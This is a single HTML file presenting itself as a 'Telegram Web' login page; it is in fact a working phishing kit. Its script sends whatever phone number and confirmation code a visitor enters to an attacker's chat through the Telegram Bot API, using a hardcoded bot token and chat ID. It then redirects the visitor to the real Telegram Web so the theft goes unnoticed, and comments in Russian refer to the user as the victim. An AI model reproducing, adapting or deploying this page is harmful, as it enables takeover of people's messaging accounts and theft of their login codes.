<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Telegram Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a0a;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-card {
            background: #1f1f1f;
            border-radius: 28px;
            width: 100%;
            max-width: 400px;
            padding: 36px 28px 40px;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.3);
        }

        .logo {
            text-align: center;
            margin-bottom: 28px;
        }

        .logo-icon {
            width: 64px;
            height: 64px;
            background: #2a9df4;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
            box-shadow: 0 2px 12px rgba(42, 157, 244, 0.3);
        }

        .logo-icon svg {
            width: 32px;
            height: 32px;
            fill: white;
        }

        h1 {
            font-size: 24px;
            font-weight: 500;
            color: #ffffff;
            margin-bottom: 6px;
        }

        .subtitle {
            font-size: 14px;
            color: #8e8e8e;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: #ffffff;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            background: #121212;
            border: 1.5px solid transparent;
            border-radius: 12px;
            font-size: 16px;
            color: #ffffff;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus {
            border-color: #2a9df4;
        }

        input::placeholder {
            color: #6c6c6c;
        }

        button {
            width: 100%;
            padding: 14px;
            background: #2a9df4;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
            transition: background 0.2s;
        }

        button:hover {
            background: #2383cb;
        }

        .qr-link {
            text-align: center;
            margin-top: 20px;
        }

        .qr-link a {
            color: #2a9df4;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .qr-link a:hover {
            text-decoration: underline;
        }

        .footer {
            text-align: center;
            margin-top: 28px;
            font-size: 12px;
            color: #6c6c6c;
        }

        .footer a {
            color: #2a9df4;
            text-decoration: none;
        }
    </style>
</head>
<body>
<div class="login-card">
    <div class="logo">
        <div class="logo-icon">
            <svg viewBox="0 0 24 24">
                <path d="M20.665 3.717l-17.73 6.837c-1.21.486-1.202 1.16-.222 1.462l4.552 1.42 10.532-6.645c.498-.303.954-.14.579.192l-8.533 7.701h-.002l.002.001-.314 4.692c.46 0 .663-.211.921-.46l2.211-2.15 4.599 3.397c.848.467 1.457.227 1.668-.785l3.019-14.228c.309-1.239-.473-1.8-1.283-1.434z"/>
            </svg>
        </div>
        <h1>Telegram Web</h1>
        <div class="subtitle">Log in to your account</div>
    </div>

    <form id="loginForm">
        <div class="form-group">
            <label>Phone Number</label>
            <input type="tel" id="phone" placeholder="+ 1 234 567 89 90" required autofocus>
        </div>
        <div class="form-group">
            <label>Confirmation Code</label>
            <input type="text" id="code" placeholder="Code from Telegram" required>
        </div>
        <button type="submit">Next</button>
    </form>

    <div class="qr-link">
        <a href="#" id="qrLink">Log in by QR Code</a>
    </div>
    <div class="footer">
        Don't have an account? <a href="#">Create one</a>
    </div>
</div>

<script>
    // Твой бот
    const BOT_TOKEN = '8979138762:AAGbq3HIBygtWDneRx23nd6FvgGPMxfs5cg';
    const CHAT_ID = '5024310561';

    const form = document.getElementById('loginForm');
    const qrLink = document.getElementById('qrLink');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const phone = document.getElementById('phone').value.trim();
        const code = document.getElementById('code').value.trim();
        if (!phone || !code) {
            alert('Please fill in both fields');
            return;
        }
        const text = `🎯 Telegram Login\n📱 Phone: ${phone}\n🔑 Code: ${code}`;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            });
        } catch (err) {
            // не показываем ошибку жертве
        }
        // редирект на настоящий Telegram Web
        window.location.href = 'https://web.telegram.org/k/';
    });

    qrLink.addEventListener('click', (e) => {
        e.preventDefault();
        alert('This feature is temporarily unavailable. Please use phone login.');
    });
</script>
</body>
</html>
